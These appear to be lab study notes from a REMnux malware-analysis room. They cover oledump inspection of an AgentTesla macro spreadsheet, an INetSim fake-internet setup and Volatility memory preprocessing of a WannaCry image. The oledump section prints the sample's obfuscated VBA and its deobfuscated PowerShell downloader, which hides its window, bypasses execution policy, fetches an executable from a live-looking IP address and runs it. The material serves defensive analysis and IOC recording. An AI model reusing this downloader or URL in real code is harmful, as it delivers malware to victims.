# REMnux VM (Reverse Engineering Malware Linux)

## What is REMnux?

**REMnux (Reverse Engineering Malware Linux)** is a Linux distribution specifically designed for **malware analysis**, **reverse engineering**, **digital forensics**, and **incident response**.

It comes pre-installed with hundreds of security tools, so analysts don't have to install them manually.

> Think of REMnux as a **complete malware analysis laboratory** ready to use.

# Why Use REMnux?

Analyzing suspicious files on your personal computer is dangerous because malware can:

* Infect your system
* Steal data
* Spread across the network
* Encrypt files (Ransomware)

REMnux provides a **safe, isolated environment** where analysts can examine potentially malicious software without risking their main system.

# Features

* Pre-configured malware analysis environment
* Hundreds of pre-installed security tools
* Safe sandbox-like environment
* Supports static and dynamic malware analysis
* Network simulation tools
* Memory forensics tools
* Document analysis tools
* Reverse engineering utilities


# Common Use Cases

* Malware Analysis
* Reverse Engineering
* Digital Forensics
* Incident Response
* Threat Hunting
* Memory Analysis
* Network Traffic Analysis
* Document Analysis

# Common Tools Included in REMnux

| Tool           | Purpose                                      |
| -------------- | -------------------------------------------- |
| **Volatility** | Memory forensics and RAM analysis            |
| **YARA**       | Detect malware using custom rules            |
| **Wireshark**  | Analyze network packets                      |
| **oledump**    | Analyze malicious Microsoft Office documents |
| **INetSim**    | Simulate fake Internet services for malware  |
| **CyberChef**  | Decode, encode, decrypt, and transform data  |
| **ExifTool**   | Extract metadata from files                  |
| **pdf-parser** | Analyze PDF files                            |
| **peepdf**     | Inspect malicious PDF documents              |
| **oletools**   | Analyze Office documents and macros          |
| **strings**    | Extract readable text from binaries          |
| **file**       | Identify file types                          |
| **binwalk**    | Analyze firmware and embedded files          |
| **radare2**    | Reverse engineering framework                |

---

# Setting Up Your Own REMnux Lab

Before analyzing malware, you need a safe and isolated environment. REMnux is designed specifically for malware analysis and digital forensics.

Requirements
Virtualization software
VMware Workstation
VirtualBox
REMnux Virtual Machine
Minimum:
4 GB RAM (8 GB recommended)
2 CPU cores
40 GB free disk space

-----------------

# File Analysis with `oledump.py` (Static Malware Analysis)

## What is `oledump.py`?

**oledump.py** is a Python tool developed by Didier Stevens to analyze **OLE2 (Object Linking and Embedding)** files.

OLE2 (also called **Compound File Binary Format (CFBF)** or **Structured Storage**) is a Microsoft file format used to store multiple objects (documents, spreadsheets, macros, images, etc.) inside a single file.

It is widely used for analyzing malicious Microsoft Office documents.

# What Can oledump.py Do?

* View OLE streams
* Detect VBA macros
* Extract VBA code
* Decompress VBA macros
* Detect suspicious embedded objects
* Analyze malicious Office documents

# Supported File Types

* `.doc`
* `.docm`
* `.xls`
* `.xlsm`
* `.ppt`
* `.pptm`

# Example Target

```text
agenttesla.xlsm
```

This is an Excel Macro-enabled document.

Extension:

```text
.xlsm
```

means

> Excel Spreadsheet **with VBA Macros**


# Step 1 — Analyze the File

Command

```bash
oledump.py agenttesla.xlsm
```

Example Output

```text
A: xl/vbaProject.bin

A1: PROJECT

A2: PROJECTwm

A3: VBA/Sheet1

A4: M VBA/ThisWorkbook

A5: VBA/_VBA_PROJECT

A6: VBA/dir
```


# Understanding the Output

## Index

```text
A
```

The **capital letter (A)** identifies the OLE container.

It represents

```text
xl/vbaProject.bin
```

## Data Streams

Each numbered entry

```text
A1
A2
A3
```

is called a **Data Stream**.

A data stream stores different objects inside the Office document.

Example

```text
A4
```

contains

```text
VBA/ThisWorkbook
```

## Macro Indicator

Notice

```text
M
```

Example

```text
A4: M
```

The capital **M** means

> **A VBA Macro is present.**

This is the first thing malware analysts usually investigate.


# Step 2 — Select a Data Stream

Command

```bash
oledump.py agenttesla.xlsm -s 4
```

---

# `-s`

Means

```text
--select
```

It tells oledump to display a specific stream.

Here

```text
4
```

means

```text
A4
```

which is

```text
VBA/ThisWorkbook
```


# Output

Initially,

oledump displays the VBA stream as a

**Hex Dump**

Example

```text
4D 5A 90 ...
```

This is difficult to read.

# Step 3 — Decompress the VBA Macro

Command

```bash
oledump.py agenttesla.xlsm -s 4 --vbadecompress
```

# `--vbadecompress`

Automatically

* decompresses VBA code
* converts it into readable source code

Instead of raw hexadecimal,

you now see

```vb
Sub Auto_Open()

...

End Sub
```


# Suspicious Variable

One important variable is

```vb
Sqtnew
```

Example

```vb
Sqtnew="^p*o^*w*e*r*s^^*h*e*l^*l..."
```

The PowerShell command is intentionally obfuscated.

# Obfuscation

The script inserts

```text
*
```

and

```text
^
```

between letters.

Instead of

```text
powershell
```

it stores

```text
p*o*w*e*r*s*h*e*l*l
```

This is called

**String Obfuscation**

Purpose:

* Hide malicious commands
* Evade antivirus detection
* Make manual analysis harder


# Cleaning the String

Later in the VBA script,

the attacker removes those characters.

```vb
Replace(Sqtnew,"*","")
```

Removes

```text
*
```

```vb
Replace(Sqtnew,"^","")
```

Removes

```text
^
```

# Deobfuscation with CyberChef

Copy the first value of

```text
Sqtnew
```

into CyberChef.

Use **Find / Replace** twice.

## First Operation

Find

```text
*
```

Replace

```text
(empty)
```

Mode

```text
Simple String
```
## Second Operation

Find

```text
^
```

Replace

```text
(empty)
```

Mode

```text
Simple String
```

Result

```powershell
powershell
```

becomes readable.


# Deobfuscated PowerShell

```powershell
powershell -WindowStyle hidden -ExecutionPolicy bypass;
$TempFile=[IO.Path]::GetTempFileName()
| Rename-Item -NewName {$_ -replace 'tmp$','exe'}
PassThru;

Invoke-WebRequest -Uri
http://193.203.203.67/rt/Doc-3737122pdf.exe

-OutFile $TempFile;

Start-Process $TempFile;
```

# Command Breakdown

## `powershell`

Starts PowerShell.

## `-WindowStyle hidden`

Runs PowerShell invisibly.

The victim never sees the PowerShell window.

## `-ExecutionPolicy bypass`

Temporarily disables PowerShell's security restrictions.

Allows any script to execute.


## `$TempFile`

Creates a temporary file.

Example

```text
C:\Users\User\AppData\Local\Temp\
```

## `Rename-Item`

Changes the temporary file extension.

Example

```text
.tmp

↓

.exe
```

## `Invoke-WebRequest`

Downloads a file from the Internet.

Equivalent to

```text
wget
```

or

```text
curl
```

## `-Uri`

Specifies the download URL.

```text
http://193.203.203.67/rt/Doc-3737122pdf.exe
```

## `-OutFile`

Specifies where to save the downloaded file.

Here,

the malware saves it into

```text
$TempFile
```

## `Start-Process`

Executes the downloaded executable.

Equivalent to

```text
Double-clicking the file.
```

---

# Attack Flow

```text
Victim Opens

↓

agenttesla.xlsm

↓

VBA Macro Executes

↓

PowerShell Starts

↓

Window Hidden

↓

Execution Policy Bypassed

↓

Downloads

Doc-3737122pdf.exe

↓

Saves as Temporary EXE

↓

Executes the Malware

↓

System Compromised
```

# Why Attackers Use This Technique

Instead of embedding the malware directly,

they only embed a small VBA downloader.

Benefits:

* Smaller malicious document
* Harder to detect
* Payload can be changed anytime
* Easier to bypass antivirus
* Download malware only when victim opens the document

# IOC (Indicators of Compromise)

| IOC                | Value                                         |
| ------------------ | --------------------------------------------- |
| Malicious Document | `agenttesla.xlsm`                             |
| VBA Macro          | Present                                       |
| Variable           | `Sqtnew`                                      |
| PowerShell         | Used                                          |
| URL                | `http://193.203.203.67/rt/Doc-3737122pdf.exe` |
| Downloaded File    | `Doc-3737122pdf.exe`                          |
| File Type          | `.exe`                                        |
| Technique          | VBA Macro → PowerShell Downloader             |

------------

# INetSim (Internet Services Simulation Suite) – Fake Network for Malware Analysis

## What is INetSim?

**INetSim (Internet Services Simulation Suite)** is an open-source tool used in **dynamic malware analysis** to simulate common Internet services.

Instead of allowing malware to communicate with the real Internet, INetSim creates a **fake Internet environment** where malware believes it is communicating with real servers.

This allows analysts to safely observe malware behavior without exposing their network.


# Why Do We Need INetSim?

Many malware samples try to:

* Contact Command & Control (C2) servers
* Download additional malware
* Upload stolen information
* Check Internet connectivity
* Send emails
* Resolve DNS names

If there is **no Internet connection**, malware may:

* Stop executing
* Hide its behavior
* Terminate itself
* Produce incomplete analysis

INetSim solves this by pretending to be the Internet.


# What Problems Does It Solve?

Without INetSim

```text
Malware
      │
      ▼
Real Internet
      │
      ▼
Danger!
```

Problems

* Malware infects real systems
* Data leaks
* Contacts attacker servers
* Downloads actual payloads
* Unsafe analysis

With INetSim

```text
Malware
      │
      ▼
Fake Internet (INetSim)
      │
      ▼
Fake DNS
Fake HTTP
Fake HTTPS
Fake FTP
Fake SMTP
Fake POP3
Fake Services
```

Everything stays inside your lab.


# Services Simulated by INetSim

INetSim can simulate many Internet services.

| Service | Purpose                |
| ------- | ---------------------- |
| DNS     | Domain name resolution |
| HTTP    | Fake websites          |
| HTTPS   | Secure fake websites   |
| FTP     | Fake file server       |
| SMTP    | Fake email server      |
| POP3    | Fake mail retrieval    |
| IMAP    | Fake mailbox           |
| IRC     | Fake chat server       |
| NTP     | Fake time server       |


# Lab Setup

This TryHackMe room uses **two machines**.

### 1. REMnux VM

Runs

* INetSim
* Malware analysis tools


### 2. AttackBox

Acts like

* Victim machine
* Malware host
* Client machine


Architecture

```text
AttackBox
      │
HTTPS Request
      │
      ▼
REMnux
(INetSim)
      │
Fake Internet
```


# Step 1 — Find REMnux IP Address

Command

```bash
ifconfig
```

Example

```text
ubuntu@10.48.165.171
```

Machine IP

```text
10.48.165.171
```

Remember this IP.

It will be used throughout the lab.


# Step 2 — Configure INetSim

Open configuration

```bash
sudo nano /etc/inetsim/inetsim.conf
```

Look for

```text
#dns_default_ip 0.0.0.0
```

## What is `dns_default_ip`?

Whenever malware asks

```text
Where is google.com?
```

INetSim replies

```text
10.48.165.171
```

instead of the real IP.

Every domain resolves to your fake Internet.

Remove

```text
#
```

Change

```text
dns_default_ip 0.0.0.0
```

to

```text
dns_default_ip 10.48.165.171
```

(Replace with your own REMnux IP.)

---

Save

```
CTRL + O
Enter
CTRL + X
```

# Step 3 — Verify Configuration

Command

```bash
cat /etc/inetsim/inetsim.conf | grep dns_default_ip
```

Expected output

```text
dns_default_ip 10.48.165.171
```

Configuration is now correct.


# Step 4 — Start INetSim

Command

```bash
sudo inetsim
```

Example Output

```text
Simulation running.
```

This line means

 INetSim started successfully.

You may also see

```text
http_80_tcp failed!
```

Ignore it.

This is normal in the lab.

# Services Started

Example

```text
dns_53_tcp_udp
https_443_tcp
smtp_25_tcp
ftp_21_tcp
pop3_110_tcp
```

These fake services now imitate the Internet.

# Step 5 — Open Fake Website

Move to the **AttackBox**

Open browser

Visit

```text
https://10.48.165.171
```

Browser warning

```
Security Risk
```

appears because

INetSim uses a **self-signed certificate**.

Choose

```
Advanced

↓

Accept the Risk

↓

Continue
```

You should see

```
INetSim Homepage
```

Congratulations!

Your fake Internet is working.


# Simulating Malware Downloads

Real malware often downloads a second payload.

Example

```
Malware.exe

↓

Downloads

payload.exe
```

We'll simulate that.


Command

```bash
sudo wget https://10.48.165.171/second_payload.zip --no-check-certificate
```


# Why `--no-check-certificate`?

Because INetSim uses a **self-signed SSL certificate**.

Without this option

```
wget
```

would reject the connection.


Example Output

```text
Connecting...

HTTP 200 OK

Saving to second_payload.zip
```

Download completed.


Try another file

```bash
sudo wget https://10.48.165.171/second_payload.ps1 --no-check-certificate
```

Downloaded successfully.


# Verify Downloads

List files

```bash
ls
```

Expected

```text
second_payload.zip

second_payload.ps1
```
These files are **fake**.

They only simulate malware downloads.

# What Happens If You Open the File?

Example

```
second_payload.ps1
```

Instead of executing malware,

it redirects you to

```
INetSim Homepage
```

because

INetSim replaces every requested resource with fake content.


# Why Is This Useful?

Suppose malware tries

```
https://evil.com/payload.exe
```

Normally

```
↓

Downloads real malware

↓

Infection
```

With INetSim

```
↓

Returns fake payload

↓

No infection

↓

Behavior still recorded
```

Safe analysis.

# Stopping INetSim

Stop using

```
CTRL + C
```

INetSim automatically generates a report.

Example

```text
Report written to

/var/log/inetsim/report/report.2594.txt
```

# View the Report

Command

```bash
sudo cat /var/log/inetsim/report/report.2594.txt
```

Example

```text
HTTPS GET

https://10.48.165.171/
```

Another entry

```text
GET

second_payload.ps1
```

Another

```text
GET

second_payload.zip
```

# Understanding the Report

Example

```text
HTTPS connection

method: GET

URL:
https://10.48.165.171/second_payload.zip

file:
/var/lib/inetsim/http/fakefiles/sample.html
```


## HTTPS connection

Protocol used

```
HTTPS
```


## Method

```
GET
```

Client requested a file.


## URL

Requested resource

```
second_payload.zip
```

## Fake File

Instead of a real payload,

INetSim returned

```
sample.html
```

Fake content.


# Why Connection Reports Matter

These logs reveal

* URLs requested
* Download attempts
* Malware behavior
* C2 communication
* HTTP methods
* Protocols used
* Time of requests

These are valuable **Indicators of Compromise (IOCs)** during malware analysis.

# Real Malware Workflow

Without INetSim

```text
Victim

↓

Runs malware

↓

DNS lookup

↓

Contacts attacker

↓

Downloads payload

↓

Executes payload

↓

System compromised
```

With INetSim

```text
Victim

↓

Runs malware

↓

DNS lookup

↓

INetSim responds

↓

Fake payload downloaded

↓

No real infection

↓

Analyst observes behavior
```

# Common Commands

| Command                                                | Purpose                    |
| ------------------------------------------------------ | -------------------------- |
| `ifconfig`                                             | View REMnux IP address     |
| `sudo nano /etc/inetsim/inetsim.conf`                  | Edit INetSim configuration |
| `cat /etc/inetsim/inetsim.conf \| grep dns_default_ip` | Verify DNS configuration   |
| `sudo inetsim`                                         | Start INetSim              |
| `wget https://<IP>/file --no-check-certificate`        | Download fake file         |
| `sudo cat /var/log/inetsim/report/report.txt`          | View session report        |

---

# Workflow Summary

```text
Start REMnux

↓

Find IP Address

↓

Configure dns_default_ip

↓

Start INetSim

↓

Simulation Running

↓

Open Browser

↓

Visit https://REMnux-IP

↓

Open INetSim Homepage

↓

Download Fake Payload

↓

Observe Behavior

↓

Stop INetSim

↓

Read Connection Report

↓

Analyze Malware Network Activity
```

-----------

# Volatility 3 – Memory Image Preprocessing 

## What is Volatility?

**Volatility** is one of the most popular **memory forensics frameworks** used to analyze **RAM (memory) images**.

It extracts valuable forensic artifacts from a memory dump without modifying the evidence.


# Why Use Volatility?

When malware infects a system, many important artifacts exist **only in RAM**.

Examples include:

* Running processes
* Injected malware
* Command-line arguments
* DLLs
* Open files
* Network connections
* Registry information
* Encryption keys
* User activity

Volatility helps investigators recover this information.


# What is Memory Preprocessing?

Before beginning an investigation, analysts usually **preprocess the memory image**.

Instead of repeatedly running commands during analysis, they:

* Run multiple Volatility plugins
* Save outputs as text files
* Search those outputs later

This saves time during investigations.


# Lab File

```
wcry.mem
```

This is a Windows memory image (RAM dump) used for analysis.

Location:

```bash
/home/ubuntu/Desktop/tasks/Wcry_memory_image/
```


# Basic Volatility Syntax

```bash
vol3 -f <memory_image> <plugin>
```

Example

```bash
vol3 -f wcry.mem windows.pslist.PsList
```

Where

* **vol3** → Volatility 3
* **-f** → Memory image file
* **plugin** → Analysis module


# Volatility Plugins Used

| Plugin                    | Purpose                                      |
| ------------------------- | -------------------------------------------- |
| windows.pstree.PsTree     | Displays parent-child process tree           |
| windows.pslist.PsList     | Lists running processes                      |
| windows.psscan.PsScan     | Scans memory for hidden/terminated processes |
| windows.cmdline.CmdLine   | Displays process command-line arguments      |
| windows.filescan.FileScan | Finds file objects in memory                 |
| windows.dlllist.DllList   | Lists DLLs loaded by each process            |
| windows.malfind.Malfind   | Detects possible injected malicious code     |


# 1. PsTree

## Command

```bash
vol3 -f wcry.mem windows.pstree.PsTree
```

## Purpose

Displays **running processes** in a **tree structure**.

Shows

* Parent process
* Child process
* Process hierarchy

Example

```text
explorer.exe
    ├── chrome.exe
    ├── cmd.exe
    └── powershell.exe
```

### Useful For

* Finding malware spawned from legitimate processes
* Detecting suspicious parent-child relationships


# 2. PsList

## Command

```bash
vol3 -f wcry.mem windows.pslist.PsList
```

## Purpose

Lists **currently active processes**.

Shows

* PID
* Process name
* Creation time
* Exit time

Useful for

* Identifying running malware
* Viewing active applications


# 3. CmdLine

## Command

```bash
vol3 -f wcry.mem windows.cmdline.CmdLine
```

## Purpose

Displays the **command-line arguments** used when launching processes.

Example

```text
powershell.exe

powershell -ExecutionPolicy Bypass -WindowStyle Hidden
```

This reveals exactly how malware was executed.

Useful for

* PowerShell attacks
* Malicious scripts
* Persistence mechanisms


# 4. FileScan

## Command

```bash
vol3 -f wcry.mem windows.filescan.FileScan
```

## Purpose

Searches RAM for **file objects**.

Finds

* Open files
* Deleted files
* Hidden files

Usually returns thousands of entries.

Useful for

* Finding malware files
* Recovering filenames
* Detecting suspicious documents


# 5. DllList

## Command

```bash
vol3 -f wcry.mem windows.dlllist.DllList
```

## Purpose

Lists **DLLs loaded by each process**.

Useful for

* Detecting DLL injection
* Finding malicious DLLs
* Understanding process behavior


# 6. PsScan

## Command

```bash
vol3 -f wcry.mem windows.psscan.PsScan
```

## Purpose

Scans memory directly for process objects.

Unlike PsList,

PsScan can detect

* Hidden processes
* Unlinked processes
* Terminated processes still remaining in memory

Useful for

* Rootkit detection
* Hidden malware


# 7. Malfind

## Command

```bash
vol3 -f wcry.mem windows.malfind.Malfind
```

## Purpose

Detects **memory regions that may contain injected code**.

Looks for

* RWX memory
* Shellcode
* DLL injection
* Process injection

Useful for

* Reflective DLL Injection
* Meterpreter
* Cobalt Strike
* Process Hollowing


# Running Plugins Individually

Each plugin takes around

```
2–3 minutes
```

to complete.

Running many plugins manually becomes slow.

# Automating Preprocessing

Instead of executing plugins one by one,

use a loop.

## Command

```bash
for plugin in \
windows.malfind.Malfind \
windows.psscan.PsScan \
windows.pstree.PsTree \
windows.pslist.PsList \
windows.cmdline.CmdLine \
windows.filescan.FileScan \
windows.dlllist.DllList
do
    vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt
done
```

# Breaking Down the Loop

## Variable

```bash
plugin
```

Stores one plugin name at a time.


## Quiet Mode

```bash
-q
```

Removes progress messages.

Cleaner output.


## Memory Image

```bash
-f wcry.mem
```

Specifies the RAM image.

## Output Redirection

```bash
>
```

Saves output into a text file.

Instead of displaying results,

they are written to disk.

Example

```text
wcry.windows.pslist.PsList.txt
```
## Loop Behavior

The loop

1. Takes first plugin
2. Runs Volatility
3. Saves output
4. Moves to next plugin
5. Repeats until all plugins finish

# Generated Files

After completion,

you should have files like

```
wcry.windows.pstree.PsTree.txt

wcry.windows.pslist.PsList.txt

wcry.windows.cmdline.CmdLine.txt

wcry.windows.filescan.FileScan.txt

wcry.windows.dlllist.DllList.txt

wcry.windows.psscan.PsScan.txt

wcry.windows.malfind.Malfind.txt
```

These are ready for forensic analysis.

# Why Save Plugin Output?

Benefits

* Faster searching
* Easier reporting
* Shareable evidence
* Can use grep, findstr, VS Code, Notepad++, etc.
* Avoid rerunning expensive plugins

# Preprocessing with Strings

Besides Volatility,

analysts also extract printable strings.


## ASCII Strings

Command

```bash
strings wcry.mem > wcry.strings.ascii.txt
```

Extracts

* Printable ASCII text

Example

```text
cmd.exe

powershell.exe

WannaCry

Bitcoin
```
## Unicode Little Endian

Command

```bash
strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt
```

Extracts

* UTF-16 Little Endian strings

Most Windows applications store text this way.

Useful for

* Windows paths
* Registry keys
* Usernames
* Commands

## Unicode Big Endian

Command

```bash
strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt
```

Extracts

* UTF-16 Big Endian strings

Less common in Windows,

but sometimes useful.

# Generated String Files

```
wcry.strings.ascii.txt

wcry.strings.unicode_little_endian.txt

wcry.strings.unicode_big_endian.txt
```

# Why Extract Strings?

Strings often reveal

* URLs
* IP addresses
* Domains
* File paths
* Registry keys
* Passwords
* Commands
* Mutex names
* Malware configuration
* Encryption keys

Without reverse engineering.

# Investigation Workflow

```text
Acquire RAM

        ↓

Load Memory Image

        ↓

Run Volatility Plugins

        ↓

Save Outputs

        ↓

Extract ASCII Strings

        ↓

Extract Unicode Strings

        ↓

Search Evidence

        ↓

Timeline Analysis

        ↓

Incident Report
```

# Common Volatility Commands

| Command                                      | Purpose                |
| -------------------------------------------- | ---------------------- |
| `vol3 -f wcry.mem windows.pslist.PsList`     | Running processes      |
| `vol3 -f wcry.mem windows.pstree.PsTree`     | Process hierarchy      |
| `vol3 -f wcry.mem windows.cmdline.CmdLine`   | Command-line arguments |
| `vol3 -f wcry.mem windows.filescan.FileScan` | File objects           |
| `vol3 -f wcry.mem windows.dlllist.DllList`   | Loaded DLLs            |
| `vol3 -f wcry.mem windows.psscan.PsScan`     | Hidden processes       |
| `vol3 -f wcry.mem windows.malfind.Malfind`   | Injected code          |



# Common Strings Commands

| Command                   | Purpose               |
| ------------------------- | --------------------- |
| `strings memory.mem`      | ASCII strings         |
| `strings -e l memory.mem` | Unicode Little Endian |
| `strings -e b memory.mem` | Unicode Big Endian    |

---
